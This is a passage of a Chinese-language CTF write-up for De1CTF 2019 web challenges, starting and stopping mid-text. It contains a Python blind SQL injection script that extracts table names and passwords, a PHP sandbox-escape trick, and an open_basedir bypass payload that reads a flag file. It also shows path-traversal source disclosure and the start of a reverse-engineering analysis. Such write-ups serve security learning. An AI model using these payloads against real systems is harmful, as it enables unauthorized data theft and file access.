r);</span><br><span class="line">             if (void 0 === o) &#123;</span><br><span class="line">               var i = Object.getPrototypeOf(e);</span><br><span class="line">               return null === i ? void 0 : t(i, r, n)</span><br><span class="line">             &#125;</span><br><span class="line">             if (&apos;value&apos; in o) return o.value;</span><br><span class="line">             var u = o.get;</span><br><span class="line">             return void 0 !== u ? u.call(n)  : void 0</span><br><span class="line">           &#125;(e.prototype.__proto__ || Object.getPrototypeOf(e.prototype), &apos;genOTP&apos;, this).call(this, n)</span><br><span class="line">         &#125;</span><br><span class="line">       &#125;,</span><br></pre></td></tr></table></figure>
+<p>查找genOTP可以查到这里可以看到，当有传入参时，第一个参赋给t，第二个赋给r。无传入时，t的缺省值为5，r的缺省值为0<br>看下面n的计算式，可以看出t便是X，r便是T0</p>
+<p>其实也可以从main.js中看出，如果知道totp的话，留意一下main.js中的注释</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">/*</span><br><span class="line">[Developer Notes]</span><br><span class="line">OTP Library for Python located in js/pyotp.zip</span><br><span class="line">Server Params:</span><br><span class="line">digits = 8</span><br><span class="line">interval = 5</span><br><span class="line">window = 1</span><br><span class="line">*/</span><br></pre></td></tr></table></figure>
+<p>可以看到这里给了默认的几个参数，并且提示服务器是使用python实现口令的验证</p>
+<p>接着回去看login，这里没给什么信息，就试试看有没有像普通的登录一样有注入的问题</p>
+<p><img src="http://shifeng-kaze.cn/blog/De1CTF2019_web_wp/09dfdeec4400c3cef8e7cd190f718c3c.png" alt=""></p>
+<p>尝试了一下发现可以绕出，但万能密码不行，那估计是分离式登录了。那就从username处入手盲注，fuzz一波后发现并没有过滤什么，但是不能用空格，因为这是命令行，会导致认为是下一个参数</p>
+<p><img src="http://shifeng-kaze.cn/blog/De1CTF2019_web_wp/7e58522c4650556212d1ace96b01aa50.png" alt=""></p>
+<p>测试了一下可以盲注，于是上脚本</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">payload:</span><br><span class="line">login &apos;or((select(length(group_concat(table_name)))from(information_schema.tables)where(table_schema=database()))&gt;0)&apos;or&apos; 1</span><br><span class="line">login &apos;or(ascii(mid(((select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())))from(1)for(1)))&gt;0)&apos;or&apos; 1</span><br><span class="line">login &apos;or((select(length(group_concat(column_name)))from(information_schema.columns)where(table_name=&apos;users&apos;))&gt;0)or&apos; 1</span><br><span class="line">login &apos;or(ascii(mid(((select(group_concat(column_name))from(information_schema.columns)where(table_name=&apos;users&apos;)))from(1)for(1)))&gt;0)or&apos; 1</span><br><span class="line">login &apos;or((select(length(group_concat(password)))from(users))=50)or&apos; 1</span><br><span class="line">login &apos;or(ascii(mid(((select(group_concat(password))from(users)))from(1)for(1)))&gt;0)or&apos; 1</span><br></pre></td></tr></table></figure>
+<p>盲注脚本<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding:utf8 -*-  </span><br><span class="line">import requests</span><br><span class="line">import re</span><br><span class="line">import time</span><br><span class="line">import pyotp</span><br><span class="line">import json</span><br><span class="line"></span><br><span class="line">totp = pyotp.TOTP(&apos;GAXG24JTMZXGKZBU&apos;,digits=8,interval = 5)</span><br><span class="line">url = &quot;http://8015fb4f-e782-4e32-9aee-3464f7a149a0.node3.buuoj.cn/shell.php?a=&quot;</span><br><span class="line"></span><br><span class="line">l1 = 0</span><br><span class="line">r1 = 100</span><br><span class="line"></span><br><span class="line">while(l1&lt;=r1):</span><br><span class="line">	mid1 = (l1 + r1)/2</span><br><span class="line">	a = &quot;login &apos;or((select(length(group_concat(password)))from(users))=&quot;+str(mid1)+&quot;)or&apos; 1&quot;</span><br><span class="line">	# a = &quot;login &apos;or((select(length(group_concat(column_name)))from(information_schema.columns)where(table_name=&apos;users&apos;))=&quot;+str(mid1)+&quot;)or&apos; 1&quot;</span><br><span class="line">	# a = &quot;login &apos;or((select(length(group_concat(table_name)))from(information_schema.tables)where(table_schema=database()))=&quot;+str(mid1)+&quot;)or&apos; 1&quot;</span><br><span class="line">	payload = url+a+&quot;&amp;totp=&quot;</span><br><span class="line">	http = requests.get(payload+str(totp.now()),timeout=5)</span><br><span class="line">	print payload+str(totp.now())</span><br><span class="line">	time.sleep(1)</span><br><span class="line">	content = json.loads(http.content)</span><br><span class="line">	if &apos;incorrect&apos; in content[&apos;message&apos;]:</span><br><span class="line">		break</span><br><span class="line">	else:</span><br><span class="line">		a = &quot;login &apos;or((select(length(group_concat(password)))from(users))&gt;&quot;+str(mid1)+&quot;)or&apos; 1&quot;</span><br><span class="line">		# a = &quot;login &apos;or((select(length(group_concat(column_name)))from(information_schema.columns)where(table_name=&apos;users&apos;))&gt;&quot;+str(mid1)+&quot;)or&apos; 1&quot;</span><br><span class="line">		# a = &quot;login &apos;or((select(length(group_concat(table_name)))from(information_schema.tables)where(table_schema=database()))&gt;&quot;+str(mid1)+&quot;)or&apos; 1&quot;</span><br><span class="line">		payload = url+a+&quot;&amp;totp=&quot;</span><br><span class="line">		http = requests.get(payload+str(totp.now()),timeout=5)</span><br><span class="line">		print payload+str(totp.now())</span><br><span class="line">		time.sleep(1)</span><br><span class="line">		content = json.loads(http.content)</span><br><span class="line">		if &apos;incorrect&apos; in content[&apos;message&apos;]:</span><br><span class="line">			l1 = mid1 + 1</span><br><span class="line">		else:</span><br><span class="line">			r1 = mid1 - 1</span><br><span class="line"></span><br><span class="line">print mid1</span><br><span class="line"></span><br><span class="line">k = &apos;&apos;</span><br><span class="line"></span><br><span class="line">for j in range(mid1):</span><br><span class="line">	l2 = 0</span><br><span class="line">	r2 = 128</span><br><span class="line">	while(l2&lt;=r2):</span><br><span class="line">		mid2 = (l2 + r2)/2</span><br><span class="line">		a = &quot;login &apos;or(ascii(mid(((select(group_concat(password))from(users)))from(&quot;+str(j+1)+&quot;)for(1)))=&quot;+str(mid2)+&quot;)or&apos; 1&quot;</span><br><span class="line">		# a = &quot;login &apos;or(ascii(mid(((select(group_concat(column_name))from(information_schema.columns)where(table_name=&apos;users&apos;)))from(&quot;+str(j+1)+&quot;)for(1)))=&quot;+str(mid2)+&quot;)or&apos; 1&quot;</span><br><span class="line">		# a = &quot;login &apos;or(ascii(mid(((select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())))from(&quot;+str(j+1)+&quot;)for(1)))=&quot;+str(mid2)+&quot;)or&apos; 1&quot;</span><br><span class="line">		payload = url+a+&quot;&amp;totp=&quot;</span><br><span class="line">		http = requests.get(payload+str(totp.now()),timeout=5)</span><br><span class="line">		print payload+str(totp.now())</span><br><span class="line">		time.sleep(1)</span><br><span class="line">		content = json.loads(http.content)</span><br><span class="line">		if &apos;incorrect&apos; in content[&apos;message&apos;]:</span><br><span class="line">			break</span><br><span class="line">		else:</span><br><span class="line">			a = &quot;login &apos;or(ascii(mid(((select(group_concat(password))from(users)))from(&quot;+str(j+1)+&quot;)for(1)))&gt;&quot;+str(mid2)+&quot;)or&apos; 1&quot;</span><br><span class="line">			# a = &quot;login &apos;or(ascii(mid(((select(group_concat(column_name))from(information_schema.columns)where(table_name=&apos;users&apos;)))from(&quot;+str(j+1)+&quot;)for(1)))&gt;&quot;+str(mid2)+&quot;)or&apos; 1&quot;</span><br><span class="line">			# a = &quot;login &apos;or(ascii(mid(((select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())))from(&quot;+str(j+1)+&quot;)for(1)))&gt;&quot;+str(mid2)+&quot;)or&apos; 1&quot;</span><br><span class="line">			payload = url+a+&quot;&amp;totp=&quot;</span><br><span class="line">			http = requests.get(payload+str(totp.now()),timeout=5)</span><br><span class="line">			print payload+str(totp.now())</span><br><span class="line">			time.sleep(1)</span><br><span class="line">			content = json.loads(http.content)</span><br><span class="line">			if &apos;incorrect&apos; in content[&apos;message&apos;]:</span><br><span class="line">				l2 = mid2 + 1</span><br><span class="line">			else:</span><br><span class="line">				r2 = mid2 - 1</span><br><span class="line">	k = k + chr(mid2)</span><br><span class="line">	print k</span><br></pre></td></tr></table></figure></p>
+<p>跑出<br>users<br>id,username,password<br>hint{G1ve_u_hi33en_C0mm3nd-sh0w_hiiintttt_23333}</p>
+<p>于是执行一下sh0w_hiiintttt_23333</p>
+<p><img src="http://shifeng-kaze.cn/blog/De1CTF2019_web_wp/665319192c8ce3c74b58d8660b0cf0f9.png" alt=""></p>
+<p>执行后提示了launch的时候会调用eval，于是先登录一波调用一下</p>
+<p><img src="http://shifeng-kaze.cn/blog/De1CTF2019_web_wp/1b6790918bbd93d28738d65ecee5598c.png" alt=""></p>
+<p>显示没有命令可以执行，于是看看md文件</p>
+<p><img src="http://shifeng-kaze.cn/blog/De1CTF2019_web_wp/2dcd1673babafdc6d7e654cdc0e2c3e8.png" alt=""></p>
+<p>应该是要用过targeting来写入，然后fuzz一下发现只能都限制了长度和0-9A-Za-z{}_$，感觉就很像沙盒逃逸</p>
+<p>php的沙盒逃逸也是很好玩，比如像{$a}或${a}可以在字符串中获得对应变量的值</p>
+<p><img src="http://shifeng-kaze.cn/blog/De1CTF2019_web_wp/fcb90cd3070d754992015b6e9c57c326.png" alt=""></p>
+<p>通过{$a(99)}调用对应函数</p>
+<p><img src="http://shifeng-kaze.cn/blog/De1CTF2019_web_wp/f0dbe278dbe9e60539389e5ca3c40c26.png" alt=""></p>
+<p>通过这样也能获得函数执行结果对应的变量的值</p>
+<p><img src="http://shifeng-kaze.cn/blog/De1CTF2019_web_wp/b6eb9d48e930e60fa8802a2aea88c158.png" alt=""></p>
+<p>从这里可以想到，我们可以通过这种方式在字符串中使用eval，尽管没有返回值，但eval依旧是执行了</p>
+<p>更多沙箱逃逸的骚操作可以看看这个<br><a href="https://xz.aliyun.com/t/4785" target="_blank" rel="noopener">从一道题讲PHP复杂变量</a></p>
+<p>先试一下</p>
+<p><img src="http://shifeng-kaze.cn/blog/De1CTF2019_web_wp/b9d29958e1711f43fdda8a74927ea7ac.png" alt=""></p>
+<p>这里通过eval执行了命令，一开始不知道为什么会error。后来看了一下响应才发现执行的结果已经返回，但由于非json才error</p>
+<p><img src="http://shifeng-kaze.cn/blog/De1CTF2019_web_wp/5ca280c5cdb5b67cd4e0ea99502d003f.png" alt=""></p>
+<p>然后尝试一下file_get_contents()取读/flag</p>
+<p><img src="http://shifeng-kaze.cn/blog/De1CTF2019_web_wp/b850c54ab36d6e4c395c2342dd109147.png" alt=""></p>
+<p>并没有返回，应该是被限制了，执行看看phpinfo()</p>
+<p><img src="http://shifeng-kaze.cn/blog/De1CTF2019_web_wp/a8c0e0b78d529621d69bd78d6f315b0a.png" alt=""></p>
+<p>可以看到open_basedir限制了只能在app以及sandbox目录下<br>要绕过这里，可以利用open_basedir设置的一个缺陷，它虽然不能在设定的目录下修改，但可以在非设定的目录下修改。也就是说，只要不在/app和/sandbox目录下，我们就可以随意修改open_basedir的值</p>
+<p>具体看一叶飘零师傅的分析<br><a href="https://skysec.top/2019/04/12/从PHP底层看open-basedir-bypass/" target="_blank" rel="noopener">从PHP底层看open_basedir bypass</a><br>感觉需要一些pwn基础，纯web手先留坑了Orz</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload:</span><br><span class="line">chdir(&apos;img&apos;);ini_set(&apos;open_basedir&apos;,&apos;..&apos;);chdir(&apos;..&apos;);chdir(&apos;..&apos;);chdir(&apos;..&apos;);chdir(&apos;..&apos;);ini_set(&apos;open_basedir&apos;,&apos;/&apos;);echo(file_get_contents(&apos;flag&apos;));</span><br></pre></td></tr></table></figure>
+<p>先进到img目录下将open_basedir设为..，然后一直返回上级目录到根目录(看phpinfo可以知道网站根目录在<code>/var/www/html/</code>)，将open_basedir设为/，然后读flag<br>其实在想为什么不能直接设为/，日后再研究研究底层看看吧</p>
+<p>不过这里要拆分成一个个变量有点麻烦，可以用一个技巧——利用{代替[。这样就能用get传值进入，直接绕过过滤<br>像这样</p>
+<p><img src="http://shifeng-kaze.cn/blog/De1CTF2019_web_wp/837acc37361dfef5762719aa7f107870.png" alt=""></p>
+<p>脚本传个值进去后</p>
+<p><img src="http://shifeng-kaze.cn/blog/De1CTF2019_web_wp/fd4cf04fecbf9edbed4955b351208042.png" alt=""></p>
+<p>命令就赋给了c，然后再执行一下</p>
+<p><img src="http://shifeng-kaze.cn/blog/De1CTF2019_web_wp/743a5258a8c566d800e22844bf1af584.png" alt=""></p>
+<p>可以看到执行成功了</p>
+<p>于是发送读取flag</p>
+<p><img src="http://shifeng-kaze.cn/blog/De1CTF2019_web_wp/8fc88668ce59583c80c682b95fa0832e.png" alt=""></p>
+<p><img src="http://shifeng-kaze.cn/blog/De1CTF2019_web_wp/94f3de7b0928eac2c746753864f676c2.png" alt=""></p>
+<h2 id="CloudMusic-rev"><a href="#CloudMusic-rev" class="headerlink" title="CloudMusic_rev"></a>CloudMusic_rev</h2><p>进入是个山寨版网易云——滑稽云，当时看界面就知道是国赛决赛的题改，然而依旧没整出来</p>
+<p>首先先注册登录，注册界面又是有一个麻烦的md5截断<br>然后看看前端的源码，在首页发现了一个接口</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- TODO 2019-08-03 06:15:32</span><br><span class="line">          To：Jessica Lee</span><br><span class="line">              Damn it! The boss said we should add firmware update function and put it online tomorrow!???</span><br><span class="line">              I havn&apos;t done yet and put the entry here.</span><br><span class="line">              You should help me coding and finish the job.</span><br><span class="line">              Security is important！！！</span><br><span class="line">              Something more, remember to delete this note!!!</span><br><span class="line">          From：Alan Wang</span><br><span class="line">      &lt;p class=&quot;p1 p2&quot;&gt;Admin Panel&lt;/p&gt;</span><br><span class="line">      &lt;span&gt;&lt;a class=&quot;a1&quot; href=&quot;#firmware&quot;&gt;Upgrade Firmware&lt;/a&gt;&lt;/span&gt;</span><br><span class="line">      --&gt;</span><br></pre></td></tr></table></figure>
+<p>去掉注释进入，提示要admin账户，于是找找看有什么办法能登录admin</p>
+<p>接着尝试一下上传，只允许mp3文件，检查了文件头，不太好利用<br>于是继续看share页面，发现很奇怪，有一首歌是加载不了的<br>看看源码，发现除了这首歌是通过<code>/media/share.php?Y292ZXIvd2VsY29tZS5wbmc=</code>这个脚本获取图片，而其它歌都是直接读取<code>/media/cover/</code>目录下对应的图片<br>看后面那串应该是base64于是解码一下得到<code>cover/welcome.png</code>，然后取访问成功获得图片</p>
+<p><img src="http://shifeng-kaze.cn/blog/De1CTF2019_web_wp/b2c6264af698713d192741c5ac549822.png" alt=""></p>
+<p>那么shell.php有可能能够获取源码，于是尝试去获取index.php</p>
+<p>base64一下访问，拿下来发现</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">urldecode path:../index.php</span><br><span class="line">.php is not allowed.</span><br></pre></td></tr></table></figure>
+<p>不允许.php，于是尝试一下urlencode,成功获得</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include_once &apos;include/config.php&apos;;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=&quot;en&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">    &lt;title&gt;Comical CloudMusic&lt;/title&gt;</span><br><span class="line"></span><br><span class="line">    &lt;link rel=&quot;stylesheet&quot; href=&quot;css/bootstrap.min.css&quot;&gt;</span><br><span class="line">    &lt;link rel=&quot;stylesheet&quot; href=&quot;css/reset.css&quot;&gt;</span><br><span class="line">    &lt;link rel=&quot;stylesheet&quot; href=&quot;css/index.css&quot;&gt;</span><br><span class="line">    &lt;link rel=&quot;stylesheet&quot; href=&quot;css/other.css&quot;&gt;</span><br><span class="line">    &lt;link rel=&quot;stylesheet&quot; href=&quot;css/APlayer.min.css&quot;&gt;</span><br><span class="line"></span><br><span class="line">    &lt;script src=&quot;js/jquery-3.2.1.min.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">    &lt;script src=&quot;js/APlayer.min.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">    &lt;script src=&quot;js/color-thief.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;header&gt;</span><br><span class="line">    &lt;div class=&quot;top&quot;&gt;</span><br><span class="line">&lt;?php include &apos;include/top.php&apos;; ?&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">&lt;/header&gt;</span><br><span class="line">&lt;div id=&quot;container&quot;&gt;</span><br><span class="line">    &lt;div id=&quot;left&quot;&gt;</span><br><span class="line">&lt;?php include &apos;include/left.php&apos;; ?&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">    &lt;div id=&quot;content&quot;&gt;&lt;/div&gt;</span><br><span class="line">    &lt;div id=&quot;player&quot;&gt;&lt;/div&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">const ap = new APlayer(&#123;</span><br><span class="line">    container: document.getElementById(&apos;player&apos;),</span><br><span class="line">    fixed: true</span><br><span class="line">&#125;);</span><br><span class="line">const colorThief = new ColorThief();</span><br><span class="line">const setTheme = (index) =&gt; &#123;</span><br><span class="line">    if (ap.list.audios.length&lt;=0) return;</span><br><span class="line">    if (ap.list.audios[index].theme==undefined) &#123;</span><br><span class="line">        colorThief.getColorAsync(ap.list.audios[index].cover, function (color) &#123;</span><br><span class="line">            ap.theme(`rgb($&#123;color[0]&#125;, $&#123;color[1]&#125;, $&#123;color[2]&#125;)`, index);</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line">ap.on(&apos;listswitch&apos;, (index) =&gt; &#123;</span><br><span class="line">    setTheme(index.index);</span><br><span class="line">&#125;);</span><br><span class="line">ap.list.add(&#123;name:&apos;Friendships&apos;,artist:&apos;Pascal Letoublon&apos;,url:&apos;/media/music/welcome.mp3&apos;,cover:&apos;/media/cover/welcome.png&apos;&#125;);</span><br><span class="line">ap.list.switch(0);</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;footer style=&quot;text-align:center;&quot;&gt;</span><br><span class="line">&lt;?php include &apos;include/bottom.php&apos;; ?&gt;</span><br><span class="line">&lt;/footer&gt;</span><br><span class="line">&lt;script src=&quot;js/hotload.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+<p>于是去拿其它几个的源码，通过index.php只能找到top这几个php，但主体部分没有。于是进到hotload.js发现hotload.php，拿下来</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$whitelist=array(&apos;index&apos;,&apos;fm&apos;,&apos;mv&apos;,&apos;friend&apos;,&apos;disk&apos;,&apos;upload&apos;,&apos;share&apos;,&apos;favor&apos;,&apos;login&apos;,&apos;reg&apos;,&apos;feedback&apos;,&apos;firmware&apos;,&apos;search&apos;,&apos;logout&apos;,&apos;info&apos;);</span><br><span class="line">if (!in_array($page,$whitelist,true)) $page=&apos;404&apos;;</span><br><span class="line"></span><br><span class="line">include &quot;include/$page.php&quot;;</span><br></pre></td></tr></table></figure>
+<p>可以看到主体部分的代码都在include里，于是全部拿下来审一下</p>
+<p>在login.php中可以看到</p>
+<p><code>$username===&#39;admin&#39;&amp;&amp;$password===$_GLOBALS[&#39;admin_password&#39;]</code></p>
+<p>admin的密码是存在GLOBALS变量中的，于是去读config</p>
+<p><code>$_GLOBALS[&#39;admin_password&#39;]=write_config(init_config(&#39;.passwd&#39;));</code></p>
+<p>可以看到密码是从通过<code>write_config()</code>获得，再继续看init.php\</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">function get_filename($ext)&#123;</span><br><span class="line">    $files=scandir(__DIR__.&apos;/../config/&apos;);</span><br><span class="line">    foreach ($files as $file) &#123;</span><br><span class="line">        if ($file != &quot;.&quot; &amp;&amp; $file != &quot;..&quot;) &#123;</span><br><span class="line">            if (substr($file,-strlen($ext))===$ext)&#123;</span><br><span class="line">                return $file;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    return &apos;&apos;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function init_config($ext)&#123;</span><br><span class="line">    $file=get_filename($ext);</span><br><span class="line">    if ($file==&apos;&apos;)&#123;</span><br><span class="line">        $file=rand_str(8).$ext;</span><br><span class="line">        file_put_contents(__DIR__.&apos;/../config/&apos;.$file, &apos;&apos;);</span><br><span class="line">        if (!file_exists(__DIR__.&apos;/../config/&apos;.$file))&#123;</span><br><span class="line">            $file==&apos;&apos;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    return $file;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function read_config($file)&#123;</span><br><span class="line">    return file_get_contents(__DIR__.&apos;/../config/&apos;.$file);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function write_config($file,$str = &apos;&apos;,$length = 16)&#123;</span><br><span class="line">    $content=file_get_contents(__DIR__.&apos;/../config/&apos;.$file);</span><br><span class="line">    if ($content==&apos;&apos;)&#123;</span><br><span class="line">        if ($str==&apos;&apos;) $str=rand_str($length);</span><br><span class="line">        file_put_contents(__DIR__.&apos;/../config/&apos;.$file, $str);</span><br><span class="line">    &#125;</span><br><span class="line">    return file_get_contents(__DIR__.&apos;/../config/&apos;.$file);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>可以看到.passwd只是个后缀名，文件名是16为的随机数，应该无法通过直接读取获得</p>
+<p>于是对着全部源码搜一下<code>$_GLOBALS[&#39;admin_password&#39;]</code>，发现只剩upload.php使用了</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$parser = FFI::cdef(&quot;</span><br><span class="line">	struct Frame&#123;</span><br><span class="line">		char * data;</span><br><span class="line">		int size;</span><br><span class="line">	&#125;;</span><br><span class="line">	struct Frame * parse(char * password, char * classname, char * filename);</span><br><span class="line">&quot;, __DIR__ .&quot;/../lib/parser.so&quot;);</span><br><span class="line">$result=$parser-&gt;parse($_GLOBALS[&apos;admin_password&apos;],&quot;title&quot;,$music_filename);</span><br></pre></td></tr></table></figure>
+<p>这里用FFI从<code>/../lib/parser.so</code>中加载了parse方法，<code>prase()</code>中需要传入三个参数：密码，类型和文件名。记得国赛时就是不会分析卡在了这Orz</p>
+<p>下面是菜鸡web手第一次搞二进制文件，找了pwn师傅来指导【师傅实在tql<br>把so文件拿下来后ida打开，进到parse函数下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">void *__fastcall parse(__int64 a1, const char *a2, __int64 a3)</span><br><span class="line">&#123;</span><br><span class="line">  __int64 v4; // [rsp+8h] [rbp-18h]</span><br><span class="line"></span><br><span class="line">  v4 = a3;</span><br><span class="line">  init_proc();</span><br><span class="line">  if ( check_password(a1) == 1 )</span><br><span class="line">  &#123;</span><br><span class="line">    if ( !strcmp(a2, &quot;title&quot;) )</span><br><span class="line">    &#123;</span><br><span class="line">      read_title(v4, &quot;title&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    else if ( !strcmp(a2, &quot;artist&quot;) )</span><br><span class="line">    &#123;</span><br><span class="line">      read_artist(v4, &quot;artist&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    else if ( !strcmp(a2, &quot;album&quot;) )</span><br><span class="line">    &#123;</span><br><span class="line">      read_album(v4, &quot;album&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  return &amp;mframe_data;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>先进入初始化<code>init_proc()</code>看看</p>
